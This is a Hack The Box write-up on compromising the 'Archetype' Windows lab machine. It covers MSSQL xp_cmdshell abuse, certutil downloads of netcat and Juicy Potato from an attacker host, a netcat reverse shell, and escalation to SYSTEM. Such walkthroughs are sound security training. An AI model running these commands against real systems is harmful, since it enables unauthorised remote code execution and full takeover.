## Hack The Box - Archetype Writeup

**Difficulty:** Easy
**OS:** Windows
**Date Completed:** July 2025

---

### Overview

Archetype is an easy Windows machine on Hack The Box that focuses on exploiting an exposed MSSQL service, followed by privilege escalation using SeImpersonate privileges with Juicy Potato. The machine is a great introduction to Windows enumeration, database exploitation, and privesc.

---

### Initial Enumeration

Ran an Nmap scan:

```
nmap -sC -sV -Pn -oN nmap.txt 10.10.10.27
```

Found the following open ports:

* 135 (RPC)
* 139, 445 (SMB)
* 1433 (MSSQL)

SMB shares were accessible without creds:

```
smbclient \\10.10.10.27\backups
```

Inside, there was a backup file:

```
get prod.dbo.backup
```

---

### MSSQL Access

Using `mssqlclient.py` from Impacket:

```
python3 mssqlclient.py sql_svc@10.10.10.27 -windows-auth
```

Enabled command execution with xp\_cmdshell:

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Confirmed RCE as user `sql_svc`.

---

### Reverse Shell

Uploaded netcat to the box:

```
EXEC xp_cmdshell 'certutil -urlcache -f http://<my-ip>/nc.exe nc.exe';
```

Set up listener:

```
nc -lvnp 4444
```

Triggered reverse shell:

```
EXEC xp_cmdshell 'nc.exe <my-ip> 4444 -e cmd.exe';
```

Shell landed as `sql_svc`.

---

### User Flag

Located in:

```
C:\Users\sql_svc\Desktop\user.txt
```

Copied and submitted.

---

### Privilege Escalation

Checked privileges:

```
whoami /priv
```

Found `SeImpersonatePrivilege` enabled. Perfect for Juicy Potato.

Uploaded Juicy Potato:

```
certutil -urlcache -f http://<my-ip>/JuicyPotato.exe jp.exe
```

Ran the exploit:

```
jp.exe -l 1337 -p cmd.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

Connected to localhost to get SYSTEM shell:

```
nc 127.0.0.1 1337
```

---

### Root Flag

Located in:

```
C:\Users\Administrator\Desktop\root.txt
```

Captured and submitted.

---

### Final Thoughts

This was a really solid Windows beginner box. MSSQL exploitation and privilege escalation via SeImpersonate are useful real-world skills, and Archetype gives you a clean, direct path to learn both. Great box for anyone new to Hack The Box or Windows exploitation.

proof of pwn - https://labs.hackthebox.com/achievement/machine/2424577/287
